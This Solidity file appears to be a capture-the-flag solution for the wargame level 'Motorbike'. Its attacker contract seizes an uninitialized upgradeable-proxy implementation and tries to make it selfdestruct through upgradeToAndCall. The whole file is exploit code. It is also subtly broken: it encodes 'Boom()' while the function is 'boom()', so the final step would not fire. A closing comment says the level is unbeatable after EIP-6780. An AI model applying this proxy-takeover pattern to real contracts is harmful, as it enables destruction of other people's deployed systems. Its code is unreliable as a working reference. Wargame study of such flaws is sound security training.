// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title 25. MOTORBIKE
 * @dev Selfdestruct the Engine contract and make the Motorbike contract unusable.
 */

interface IEngine {
    function initialize() external;

    function upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) external payable;
}

contract Bicycle {
    IEngine private immutable engine;

    constructor(address _engine) {
        engine = IEngine(_engine);
    }

    function attack() public {
        // 1. Initialize the engine contract
        engine.initialize();
        // 2. Upgrade the engine contract to a new implementation and kill it
        engine.upgradeToAndCall(
            address(this),
            abi.encodeWithSignature("Boom()")
        );
    }

    function boom() external {
        selfdestruct(payable(msg.sender));
    }
}

// LEVEL UNBEATABLE SINCE THE DENCUN UPGRADE - SEE EIP6780 | selfdestruct
